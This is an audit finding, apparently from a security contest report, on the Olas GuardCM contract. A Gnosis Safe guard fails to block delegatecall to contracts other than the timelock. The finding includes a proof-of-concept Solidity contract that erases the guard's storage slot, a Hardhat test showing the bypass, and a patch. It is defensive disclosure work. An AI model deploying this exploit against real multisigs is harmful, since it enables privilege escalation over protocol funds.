[H-02] CM candelegatecallto any address and bypass all restrictions
Submitted byEV_om
TheGuardCMcontract is designed to restrict the Community Multisig (CM) actions within the protocol to only specific contracts and methods. This is achieved by implementing acheckTransaction()method, which is invoked by the CMGnosisSafebefore every transaction. WhenGuardCMis not paused, the implementation restricts calls to theschedule()andscheduleBatch()methods in the timelock to only specific targets and selectors, performs additional checks on calls forwarded to the L2s and blocks self-calls on the CM itself, which prevents it from unilaterally removing the guard:
if(to==owner) {// No delegatecall is allowedif(operation==Enum.Operation.DelegateCall) {revertNoDelegateCall();}// Data needs to have enough bytes at least to fit the selectorif(data.length<SELECTOR_DATA_LENGTH) {revertIncorrectDataLength(data.length,SELECTOR_DATA_LENGTH);}// Get the function signaturebytes4functionSig=bytes4(data);// Check the schedule or scheduleBatch function authorized parameters// All other functions are not checked forif(functionSig==SCHEDULE||functionSig==SCHEDULE_BATCH) {// Data length is too short: need to have enough bytes for the schedule() function// with one selector extracted from the payloadif(data.length<MIN_SCHEDULE_DATA_LENGTH) {revertIncorrectDataLength(data.length,MIN_SCHEDULE_DATA_LENGTH);}_verifySchedule(data,functionSig);}}elseif(to==multisig) {// No self multisig call is allowedrevertNoSelfCall();}
However, a critical oversight in the current implementation allows the CM to performdelegatecalls to any address but the timelock. As can be seen above,DelegateCalloperations are only disallowed when the target is the timelock (represented by theownervariable). What this effectively means is that the CM cannot run anyTimelockfunction in its own context, but it candelegatecallto any other contract and hence execute arbitrary code. This allows it to trivially bypass the guard by delegating to a contract that removes the guard variable from the CM’s storage.
The CM holds all privileged roles within the timelock, which is in turn the protocol’s owner. This means that the CM can potentially gain unrestricted control over the entire protocol. As such, this vulnerability represents a significant risk of privilege escalation and is classified as high severity.
Proof of Concept
We can validate the vulnerability through an additional test case for theGuardCM.jstest suite. This test case will simulate the exploit scenario and confirm the issue by performing the following actions:
It sets up the guard using thesetGuardfunction with the appropriate parameters.It attempts to execute an unauthorized call via delegatecall to the timelock, which should be reverted by the guard as expected.It deploys an exploit contract, which contains a function to delete the guard storage.It calls thedeleteGuardStoragefunction through a delegatecall from the CM, which will remove the guard variable from the safe’s storage.It repeats the unauthorized call from step 2. This time, the call succeeds, indicating that the guard has been bypassed.
A simple exploit contract could look as follows:
pragmasolidity^0.8.0;contractDelegatecallExploitContract{bytes32internalconstantGUARD_STORAGE_SLOT=0x4a204f620c8c5ccdca3fd54d003badd85ba500436a431f0cbda4f558c93c34c8;functiondeleteGuardStorage()public{assembly{sstore(GUARD_STORAGE_SLOT,0)}}}
And the test:
it("CM can remove guard through delegatecall",asyncfunction() {// Setting the CM guardletnonce=awaitmultisig.nonce();lettxHashData=awaitsafeContracts.buildContractCall(multisig,"setGuard", [guard.address],nonce,0,0);letsignMessageData=newArray();for(leti=1;i<=safeThreshold;i++) {signMessageData.push(awaitsafeContracts.safeSignMessage(signers[i],multisig,txHashData,0));}awaitsafeContracts.executeTx(multisig,txHashData,signMessageData,0);// Attempt to execute an unauthorized callletpayload=treasury.interface.encodeFunctionData("pause");nonce=awaitmultisig.nonce();txHashData=awaitsafeContracts.buildContractCall(timelock,"schedule", [treasury.address,0,payload,Bytes32Zero,Bytes32Zero,0],nonce,0,0);for(leti=0;i<safeThreshold;i++) {signMessageData[i] =awaitsafeContracts.safeSignMessage(signers[i+1],multisig,txHashData,0);}awaitexpect(safeContracts.executeTx(multisig,txHashData,signMessageData,0)).to.be.reverted;// Deploy and delegatecall to exploit contractconstDelegatecallExploitContract=awaitethers.getContractFactory("DelegatecallExploitContract");constexploitContract=awaitDelegatecallExploitContract.deploy();awaitexploitContract.deployed();nonce=awaitmultisig.nonce();txHashData=awaitsafeContracts.buildContractCall(exploitContract,"deleteGuardStorage", [],nonce,1,0);for(leti=0;i<safeThreshold;i++) {signMessageData[i] =awaitsafeContracts.safeSignMessage(signers[i+1],multisig,txHashData,0);}awaitsafeContracts.executeTx(multisig,txHashData,signMessageData,0);// Unauthorized call succeeds since we have removed the guardnonce=awaitmultisig.nonce();txHashData=awaitsafeContracts.buildContractCall(timelock,"schedule", [treasury.address,0,payload,Bytes32Zero,Bytes32Zero,0],nonce,0,0);for(leti=0;i<safeThreshold;i++) {signMessageData[i] =awaitsafeContracts.safeSignMessage(signers[i+1],multisig,txHashData,0);}awaitsafeContracts.executeTx(multisig,txHashData,signMessageData,0);});
To run the exploit test:
Save the exploit contract somewhere under thegovernancedirectory asDelegatecallExploitContract.sol.Add the test to the"Timelock manipulation via the CM"context ingovernance/test/GuardCM.jsand run it using the commandnpx hardhat test --grep "CM cannot bypass guard through delegatecall". This will run the test above, which should demonstrate the exploit by successfully making an unauthorized call after the guard has been bypassed.
Tools Used
Hardhat
Recommended Mitigation Steps
Disallowdelegatecalls entirely:
@@ -397,15 +397,14 @@ contract GuardCM {bytes memory,address) external {+        // No delegatecall is allowed+        if (operation == Enum.Operation.DelegateCall) {+            revert NoDelegateCall();+        }// Just return if pausedif (paused == 1) {// Call to the timelockif (to == owner) {-                // No delegatecall is allowed-                if (operation == Enum.Operation.DelegateCall) {-                    revert NoDelegateCall();-                }-// Data needs to have enough bytes at least to fit the selectorif (data.length < SELECTOR_DATA_LENGTH) {
kupermind (Olas) confirmed:
kupermind (sponsor) confirmed